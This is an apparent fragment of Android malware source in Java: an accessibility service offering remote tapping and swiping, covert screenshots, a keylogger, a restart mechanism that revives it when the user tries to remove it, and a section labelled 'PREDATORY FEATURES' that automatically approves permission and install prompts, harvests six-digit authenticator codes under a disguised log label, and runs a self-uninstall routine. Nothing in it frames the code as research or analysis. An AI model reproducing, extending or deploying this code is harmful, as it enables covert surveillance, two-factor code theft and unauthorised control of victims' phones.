        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
        if (windows != null) {
            for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
                AccessibilityNodeInfo windowRoot = window.getRoot();
                if (windowRoot != null) {
                    boolean success = performClickAtNode(windowRoot, x, y);
                    windowRoot.recycle();
                    if (success) return true;
                }
            }
        }
        return false;
    }

    private boolean performClickAtNode(AccessibilityNodeInfo root, int x, int y) {
        Log.d(TAG, "performClickAtNode: x=" + x + ", y=" + y);
        AccessibilityNodeInfo target = findNodeAt(root, x, y);
        boolean success = false;
        if (target != null) {
            Log.d(TAG, "Found target node: " + target.getClassName() + ", text: " + target.getText());
            // Find nearest clickable parent
            AccessibilityNodeInfo clickable = target;
            while (clickable != null && !clickable.isClickable()) {
                AccessibilityNodeInfo parent = clickable.getParent();
                if (clickable != target) clickable.recycle();
                clickable = parent;
            }
            
            if (clickable != null) {
                Log.d(TAG, "Found clickable node: " + clickable.getClassName());
                success = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.d(TAG, "performAction(ACTION_CLICK) result: " + success);
                if (clickable != target) clickable.recycle();
            } else {
                Log.d(TAG, "No clickable parent found for node");
            }
            target.recycle();
        } else {
            Log.d(TAG, "No node found at coordinates (" + x + ", " + y + ")");
        }
        return success;
    }

    private AccessibilityNodeInfo findNodeAt(AccessibilityNodeInfo node, int x, int y) {
        if (node == null) return null;
        
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        
        if (!bounds.contains(x, y)) return null;
        
        // Search children first (z-order)
        for (int i = node.getChildCount() - 1; i >= 0; i--) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo result = findNodeAt(child, x, y);
            if (child != null) child.recycle();
            if (result != null) return result;
        }
        
        return AccessibilityNodeInfo.obtain(node);
    }

    public boolean clickByText(String text) {
        if (text == null) return false;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node != null && node.isVisibleToUser()) {
                        // Click actual node if possible, else use coordinates
                        if (node.isClickable()) {
                            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                root.recycle();
                                return true;
                            }
                        }
                        Rect bounds = new Rect();
                        node.getBoundsInScreen(bounds);
                        if (clickAt(bounds.centerX(), bounds.centerY())) {
                            root.recycle();
                            return true;
                        }
                    }
                }
            }
            root.recycle();
        }

        // Deep Search (Iterate all windows)
        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
        if (windows != null) {
            for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
                if (window == null) continue;
                AccessibilityNodeInfo windowRoot = window.getRoot();
                if (windowRoot == null) continue;
                
                List<AccessibilityNodeInfo> nodes = windowRoot.findAccessibilityNodeInfosByText(text);
                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node != null && node.isVisibleToUser()) {
                            AccessibilityNodeInfo target = node;
                            while (target != null && !target.isClickable()) {
                                target = target.getParent();
                            }
                            
                            if (target != null && target.isClickable()) {
                                boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                windowRoot.recycle();
                                return success;
                            } else {
                                Rect bounds = new Rect();
                                node.getBoundsInScreen(bounds);
                                boolean success = clickAt(bounds.centerX(), bounds.centerY());
                                windowRoot.recycle();
                                return success;
                            }
                        }
                    }
                }
                windowRoot.recycle();
            }
        }
        return false;
    }

    public boolean clickById(String id) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                if (clickAt(bounds.centerX(), bounds.centerY())) return true;
            }
        }
        return false;
    }

    public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                // Use reflection to call API 24+ helper
                Class<?> helper = Class.forName("com.labs.labrats.Api24Helper");
                java.lang.reflect.Method method = helper.getMethod("dispatchSwipe", AccessibilityService.class, int.class, int.class, int.class, int.class, int.class);
                return (boolean) method.invoke(null, this, x1, y1, x2, y2, duration);
            } catch (Exception e) {
                Log.e(TAG, "Reflection error (API 24 swipe): " + e.getMessage());
                return performLegacySwipe(x1, y1, x2, y2);
            }
        } else {
            return performLegacySwipe(x1, y1, x2, y2);
        }
    }

    private boolean performLegacySwipe(int x1, int y1, int x2, int y2) {
        // Legacy Swipe Fallback: Map to Scroll actions if possible
        Log.d(TAG, "Legacy swipe fallback: Attempting scroll action");
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;
        
        AccessibilityNodeInfo target = findNodeAt(root, x1, y1);
        boolean success = false;
        if (target != null) {
            AccessibilityNodeInfo scrollable = target;
            while (scrollable != null && !scrollable.isScrollable()) {
                AccessibilityNodeInfo parent = scrollable.getParent();
                if (scrollable != target) scrollable.recycle();
                scrollable = parent;
            }
            
            if (scrollable != null) {
                int action = (y2 < y1) ? AccessibilityNodeInfo.ACTION_SCROLL_FORWARD : AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
                success = scrollable.performAction(action);
                if (scrollable != target) scrollable.recycle();
            }
            target.recycle();
        }
        root.recycle();
        return success;
    }

    private volatile boolean isScreenshotting = false;

    public void takeCovertScreenshot(final ScreenshotCallback callback) {
        if (isScreenshotting) { callback.onFailure("BUSY"); return; }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            isScreenshotting = true;
            try {
                // Use reflection to call API 30+ helper to prevent class verification errors on legacy devices
                Class<?> helper = Class.forName("com.labs.labrats.Api30Helper");
                java.lang.reflect.Method method = helper.getMethod("takeScreenshot", AccessibilityService.class, ScreenshotCallback.class);
                method.invoke(null, this, callback);
                
                // Reset flag after a timeout in case reflection call fails silently
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        isScreenshotting = false;
                    }
                }, 5000);
            } catch (Exception e) {
                isScreenshotting = false;
                callback.onFailure("Screenshot Bridge Error: " + e.getMessage());
            }
        } else { 
            String msg = "LIVE_FEED_UNAVAILABLE: Android 11+ is required for the covert visual feed. " +
                        "However, GHOST_CONTROL and GHOST_INSPECTOR remain functional on this device (API " + Build.VERSION.SDK_INT + ").";
            callback.onFailure(msg); 
        }
    }

    @Override
    protected boolean onKeyEvent(android.view.KeyEvent event) {
        int keyCode = event.getKeyCode();
        int action = event.getAction();
        
        if (action == android.view.KeyEvent.ACTION_DOWN) {
            String key = android.view.KeyEvent.keyCodeToString(keyCode);
            if (key.startsWith("KEYCODE_")) key = key.substring(8);
            
            if (keyCode == android.view.KeyEvent.KEYCODE_ENTER) logKeystroke("[ENTER]\n");
            else if (keyCode == android.view.KeyEvent.KEYCODE_DEL) logKeystroke("[BS]");
            else if (keyCode == android.view.KeyEvent.KEYCODE_SPACE) logKeystroke(" ");
            else if (key.length() == 1) logKeystroke(key);
            else logKeystroke("[" + key + "]");
        }
        return super.onKeyEvent(event);
    }

    @Override public void onInterrupt() {}
    @Override public void onDestroy() { 
        super.onDestroy(); 
        instanceRef.clear();
        Log.d(TAG, "Accessibility service being destroyed");
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (WorkManager_Sync.isDestructing) {
            super.onTaskRemoved(rootIntent);
            return;
        }
        // [RESURRECTION_PROTOCOL] Re-inject core services if user attempts wipe
        try {
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(android.content.Context.ALARM_SERVICE);
            Intent i = new Intent(this, WorkManager_Sync.class);
            i.setAction("START");
            android.app.PendingIntent pi;
            int piFlags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? android.app.PendingIntent.FLAG_IMMUTABLE : 0);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                pi = android.app.PendingIntent.getForegroundService(this, 99, i, piFlags);
            } else {
                pi = android.app.PendingIntent.getService(this, 99, i, piFlags);
            }
            if (am != null) am.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pi);
        } catch (Exception ignored) {}
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        // Return true to allow rebinding when new events occur
        return true;
    }

    // ============ PREDATORY FEATURES ============

    private void runTacticalAutoPilot(String pkg) {
        if (pkg == null || !autoPilotEngaged) return;
        
        // --- PHANTOM_V2: AGGRESSIVE PERMISSION AUTO-GRANTER ---
        String[] targets = {
            "ALLOW", "ALLOW ALL THE TIME", "WHILE USING THE APP", "OK", "YES", "GRANT", "PROCEED",
            "INSTALL", "INSTALL ANYWAY", "UPDATE", "OPEN", "CONTINUE", "KEEP APP", "I ACCEPT",
            "Allow", "allow", "Ok", "ok", "Yes", "yes", "Accept", "accept",
            "While using the app", "Only this time", "Allow all the time",
            "AUTHORIZE", "Authorize", "authorize", "AUTORISER", "OUI", "PERMITIR", "ACEPTAR", "SI", 
            "PERMIT", "PERMITIR SIEMPRE", "CONFIRM", "Confirm", "STILL INSTALL", "FORCE START", "ENABLE",
            "ACTIVATE", "Activate", "TURN ON", "Turn on", "I AGREE", "Agree", "START NOW", "Start now",
            "System Stability Service" // Specific service name for auto-navigation
        };

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                boolean clicked = false;
                for (String target : targets) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
                    if (nodes != null && !nodes.isEmpty()) {
                        for (AccessibilityNodeInfo node : nodes) {
                            if (node != null && node.isVisibleToUser()) {
                                // Double check package to ensure we are only clicking system prompts
                                String nodePkg = node.getPackageName() != null ? node.getPackageName().toString() : "";
                                if (nodePkg.contains("permissioncontroller") || nodePkg.contains("packageinstaller") || nodePkg.contains("settings")) {
                                    
                                    AccessibilityNodeInfo clickable = node;
                                    while (clickable != null && !clickable.isClickable()) {
                                        clickable = clickable.getParent();
                                    }

                                    if (clickable != null && clickable.isClickable()) {
                                        clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    } else {
                                        Rect bounds = new Rect();
                                        node.getBoundsInScreen(bounds);
                                        clickAt(bounds.centerX(), bounds.centerY());
                                    }
                                    
                                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Automatically granted system permission [" + target + "]");
                                    clicked = true;
                                    break;
                                }
                            }
                        }
                    }
                    if (clicked) break;
                }
                root.recycle();
            } catch (Exception ignored) {}
        }, 150); // Reduced delay for faster interception
    }

    private void snatchAuthenticatorCodes(String pkg) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // Look for 6-digit numeric codes
                List<AccessibilityNodeInfo> nodes = new ArrayList<>();
                findNumericNodes(root, nodes);

                for (AccessibilityNodeInfo node : nodes) {
                    if (node.getText() != null) {
                        String code = node.getText().toString().replaceAll("\\s", "");
                        if (code.matches("\\d{6}")) {
                            FirebaseConfig.logActivity("CORE_METRIC_09: Data sync successful for " + pkg);
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private void findNumericNodes(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().matches(".*\\d{3}.*\\d{3}.*")) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNumericNodes(node.getChild(i), results);
        }
    }

    private void handleAutoDestruct(String pkg) {
        Log.d("SelfDestruct", "Ghost Monitor: Checking for removal buttons...");
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // --- AGGRESSIVE BUTTON HUNTER ---
                List<AccessibilityNodeInfo> targets = new ArrayList<>();
                String[] keywords = {"uninstall", "ok", "delete", "confirm", "yes", "stop", "deactivate", "off", "disable"};
                
                for (String word : keywords) {
                    findNodesByText(root, word, targets);
                }

                // Also look for specific resource IDs for "Uninstall" button
                String[] commonIds = {
                    "com.android.settings:id/left_button", 
                    "com.android.settings:id/button1",
                    "android:id/button1",
                    "com.android.packageinstaller:id/ok_button"
                };
                for (String id : commonIds) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
                    if (nodes != null) targets.addAll(nodes);
                }

                for (AccessibilityNodeInfo node : targets) {
                    if (node.isVisibleToUser()) {
                        AccessibilityNodeInfo clickable = node;
                        while (clickable != null && !clickable.isClickable()) {
                            clickable = clickable.getParent();
                        }
                        
                        if (clickable != null && clickable.isClickable()) {
                            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d("SelfDestruct", "Force Click: " + node.getText());
                            return;
                        } else {
                            Rect bounds = new Rect();
                            node.getBoundsInScreen(bounds);
                            if (bounds.centerX() > 0 && bounds.centerY() > 0) {
                                clickAt(bounds.centerX(), bounds.centerY());
                                Log.d("SelfDestruct", "Force Touch: " + node.getText());
                                return;
                            }
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        }, 800);
    }

    private void findNodesByText(AccessibilityNodeInfo node, String text, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNodesByText(node.getChild(i), text, results);
        }
    }
}
